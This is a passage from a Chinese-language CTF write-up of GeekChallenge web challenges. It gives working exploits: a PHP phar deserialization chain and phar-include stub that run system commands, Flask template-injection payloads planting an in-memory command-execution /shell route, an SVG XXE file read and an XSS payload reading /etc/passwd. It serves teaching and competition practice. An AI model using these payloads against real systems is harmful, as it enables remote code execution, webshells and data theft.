</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;?php if ($error !== null &amp;&amp; $error !== &#39;&#39;): ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;alert error&#34; role=&#34;alert&#34;&gt;&lt;?php echo htmlspecialchars($error, ENT_QUOTES); ?&gt;&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;?php endif; ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;!--RUN printf &#34;open_basedir=/var/www/html:/tmp\nsys_temp_dir=/tmp\nupload_tmp_dir=/tmp\n&#34; \
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &gt; /usr/local/etc/php/conf.d/zz-open_basedir.ini--&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;?php if ($content !== null): ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;result&#34; aria-live=&#34;polite&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;div class=&#34;meta&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;div&gt;文件：&lt;?php echo htmlspecialchars($filename, ENT_QUOTES); ?&gt;&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;div style=&#34;font-size:12px;color:var(--muted)&#34;&gt;&lt;?php echo strlen($content); ?&gt; bytes&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;div class=&#34;body&#34;&gt;&lt;pre&gt;&lt;?php echo htmlspecialchars($content, ENT_QUOTES); ?&gt;&lt;/pre&gt;&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;?php elseif ($error === null &amp;&amp; isset($_GET[&#39;filename&#39;])): ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;alert warn&#34;&gt;未能读取内容或文件为空。&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;?php endif; ?&gt;
</span></span></span></code></pre></div><p>function.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $luo;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__toString</span>() {
</span></span><span style="display:flex;"><span>        $function <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">luo</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $function();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">B</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $a;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $test;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__wakeup</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__invoke</span>() {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rce_me</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $b;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($b <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> $b;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">rce_me</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Success!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /flag/flag.txt &gt; /tmp/flag&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>想找文件上传点，robots.txt：</p>
<pre tabindex="0"><code>User-agent: * 
Disallow: /var/www/html/uploads.php
</code></pre><p>uploads.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$uploadDir <span style="color:#f92672">=</span> <span style="color:#66d9ef">__DIR__</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/uploads/&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($uploadDir)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mkdir</span>($uploadDir, <span style="color:#ae81ff">0755</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$whitelist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;txt&#39;</span>, <span style="color:#e6db74">&#39;log&#39;</span>, <span style="color:#e6db74">&#39;jpg&#39;</span>, <span style="color:#e6db74">&#39;jpeg&#39;</span>, <span style="color:#e6db74">&#39;png&#39;</span>, <span style="color:#e6db74">&#39;zip&#39;</span>,<span style="color:#e6db74">&#39;gif&#39;</span>,<span style="color:#e6db74">&#39;gz&#39;</span>];
</span></span><span style="display:flex;"><span>$allowedMimes <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;txt&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;text/plain&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;log&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;text/plain&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;jpg&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/jpeg&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;jpeg&#39;</span> <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/jpeg&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;png&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/png&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;zip&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;application/zip&#39;</span>, <span style="color:#e6db74">&#39;application/x-zip-compressed&#39;</span>, <span style="color:#e6db74">&#39;multipart/x-zip&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;gif&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/gif&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;gz&#39;</span>   <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;application/gzip&#39;</span>, <span style="color:#e6db74">&#39;application/x-gzip&#39;</span>]
</span></span><span style="display:flex;"><span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>])) {
</span></span><span style="display:flex;"><span>    $file <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($file[<span style="color:#e6db74">&#39;error&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#a6e22e">UPLOAD_ERR_OK</span>) {
</span></span><span style="display:flex;"><span>        $originalName <span style="color:#f92672">=</span> $file[<span style="color:#e6db74">&#39;name&#39;</span>];
</span></span><span style="display:flex;"><span>        $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">pathinfo</span>($originalName, <span style="color:#a6e22e">PATHINFO_EXTENSION</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($ext, $whitelist, <span style="color:#66d9ef">true</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;File extension not allowed.&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $mime <span style="color:#f92672">=</span> $file[<span style="color:#e6db74">&#39;type&#39;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($allowedMimes[$ext]) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($mime, $allowedMimes[$ext], <span style="color:#66d9ef">true</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;MIME type mismatch or not allowed. Detected: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($mime));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $safeBaseName <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[^A-Za-z0-9_\-\.]/&#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>, <span style="color:#a6e22e">basename</span>($originalName));
</span></span><span style="display:flex;"><span>        $safeBaseName <span style="color:#f92672">=</span> <span style="color:#a6e22e">ltrim</span>($safeBaseName, <span style="color:#e6db74">&#39;.&#39;</span>);
</span></span><span style="display:flex;"><span>        $targetFilename <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;_&#39;</span> <span style="color:#f92672">.</span> $safeBaseName;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;/tmp/log.txt&#39;</span>, <span style="color:#e6db74">&#34;upload file success: </span><span style="color:#e6db74">$targetFilename</span><span style="color:#e6db74">, MIME: </span><span style="color:#e6db74">$mime\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $targetPath <span style="color:#f92672">=</span> $uploadDir <span style="color:#f92672">.</span> $targetFilename;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">move_uploaded_file</span>($file[<span style="color:#e6db74">&#39;tmp_name&#39;</span>], $targetPath)) {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">@</span><span style="color:#a6e22e">chmod</span>($targetPath, <span style="color:#ae81ff">0644</span>);
</span></span><span style="display:flex;"><span>            $resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;success&#34;&gt; File uploaded successfully &#39;</span><span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            $resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;error&#34;&gt; Failed to move uploaded file.&lt;/div&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;error&#34;&gt; Upload error: &#39;</span> <span style="color:#f92672">.</span> $file[<span style="color:#e6db74">&#39;error&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><code>B.__wakeup() -&gt; A.__toString() -&gt; B.__invoke()</code>，应该是要利用phar伪协议进行反序列化，exp：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $luo;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">B</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $a;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $test;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $b;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$obj1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">C</span>();
</span></span><span style="display:flex;"><span>$obj2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">B</span>();
</span></span><span style="display:flex;"><span>$obj2<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> $obj1;
</span></span><span style="display:flex;"><span>$obj3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">A</span>();
</span></span><span style="display:flex;"><span>$obj3<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">luo</span> <span style="color:#f92672">=</span> $obj2;
</span></span><span style="display:flex;"><span>$obj4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">B</span>();
</span></span><span style="display:flex;"><span>$obj4<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> $obj3;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>(<span style="color:#e6db74">&#34;phar.phar&#34;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#39;phar.phar&#39;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">stopBuffering</span>();
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#39;GIF89a&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#39;test.txt&#39;</span>,<span style="color:#e6db74">&#39;test&#39;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">setMetadata</span>($obj4);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">stopBuffering</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>修改phar后缀名为jpg，上传文件后读取 /tmp/log.txt：</p>
<pre tabindex="0"><code>upload file success: 1762752974_phar.jpg, MIME: image/jpeg
</code></pre><p>根据 <code>index.php</code> 中关于 <code>open_basedir</code> 的信息：</p>
<pre tabindex="0"><code>&lt;!--RUN printf &#34;open_basedir=/var/www/html:/tmp\nsys_temp_dir=/tmp\nupload_tmp_dir=/tmp\n&#34; \
    &gt; /usr/local/etc/php/conf.d/zz-open_basedir.ini--&gt;
</code></pre><p>可以直接访问上传的目录，后续直接phar反序列化上传文件即可，注意添加 <code>serialized</code> 参数用于包含 <code>function.php</code>：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/16.png"></p>
<p>最后读取 <code>/tmp/flag</code> 获取flag</p>
<h2 id="eeeeezzzzzzzip">eeeeezzzzzzZip<a hidden class="anchor" aria-hidden="true" href="#eeeeezzzzzzzip">#</a></h2>
<p>phar include RCE，将 phar 打包成 gz等压缩文件被 include 同样会执行stub中的php代码，exp：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#39;exploit.phar&#39;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">startBuffering</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$stub <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;&lt;&lt;&#39;</span><span style="color:#e6db74">STUB</span><span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    system(&#39;cat /flag/flag.txt&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __HALT_COMPILER();
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">STUB</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>($stub);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#39;test.txt&#39;</span>, <span style="color:#e6db74">&#39;test&#39;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stopBuffering</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/1.png"></p>
<h2 id="路在脚下">路在脚下<a hidden class="anchor" aria-hidden="true" href="#路在脚下">#</a></h2>
<p>初步测试，ban了 <code>before_request after_request error</code>，由于网页无执行结果回显考虑打内存马创建路由</p>
<p>向 url_map 中新增一条 urlrule 创建 <code>/shell</code> 路由，payload1：</p>
<pre tabindex="0"><code>{{url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;app.url_map.add(app.url_rule_class(&#39;/shell&#39;,methods=[&#39;GET&#39;],endpoint=&#39;shell&#39;))&#34;,{&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]})}}
</code></pre><p>向 view_function 中添加对应 endpoint 的实现</p>
<pre tabindex="0"><code>{{url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;app.view_functions.update({&#39;shell&#39;:lambda:__import__(&#39;os&#39;).popen(app.request_context.__globals__[&#39;request_ctx&#39;].request.args.get(&#39;cmd&#39;,&#39;whoami&#39;)).read()})&#34;,{&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]})}}
</code></pre><p>访问 <code>/shell</code>，页面显示 root 表明路由创建成功，传参cmd实现rce</p>
<h2 id="image-viewer">Image Viewer<a hidden class="anchor" aria-hidden="true" href="#image-viewer">#</a></h2>
<p>允许上传的文件类型：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">accept</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.svg,image/svg+xml,.png,.jpg,.jpeg,.gif,image/*&#34;</span> /&gt;
</span></span></code></pre></div><p>svg XXE：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34; &gt;</span> ]&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;400px&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;128px&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">xmlns:xlink=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;text</span> <span style="color:#a6e22e">font-size=</span><span style="color:#e6db74">&#34;16&#34;</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;16&#34;</span><span style="color:#f92672">&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/text&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/svg&gt;</span>
</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/12.png"></p>
<h2 id="pdf-viewer">PDF Viewer<a hidden class="anchor" aria-hidden="true" href="#pdf-viewer">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(){document.<span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>)};<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74">&#39;file:///etc/passwd&#39;</span>);<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">send</span>();&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/13.png"></p>
<p>有个弱口令用户，先尝试直接读 <code>/proc/self/environ</code>：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/14.png"></p>
<p>爆破管理员口令：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/15.png"></p>
<h2 id="路在脚下_revenge">路在脚下_revenge<a hidden class="anchor" aria-hidden="true" href="#路在脚下_revenge">#</a></h2>
<p>同路在脚下</p>
<h2 id="xross-the-doom">Xross The Doom<a hidden class="anchor" aria-hidden="true" href="#xross-the-doom">#</a></h2>
<p>package.json：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;xross&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;1.0.0&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;oh, no!&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;main&#34;</span>: <span style="color:#e6db74">&#34;server.js&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;scripts&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;start&#34;</span>: <span style="color:#e6db74">&#34;node server.js&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;dev&#34;</span>: <span style="color:#e6db74">&#34;NODE_ENV=development node server.js&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;solve&#34;</span>: <span style="color:#e6db74">&#34;node solve.js&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;bot&#34;</span>: <span style="color:#e6db74">&#34;node bot.js&#34;</span>
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;author&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;license&#34;</span>: <span style="color:#e6db74">&#34;MIT&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;dependencies&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;cookie-parser&#34;</span>: <span style="color:#e6db74">&#34;^1.4.7&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;express&#34;</span>: <span style="color:#e6db74">&#34;^5.1.0&#34;</span>,
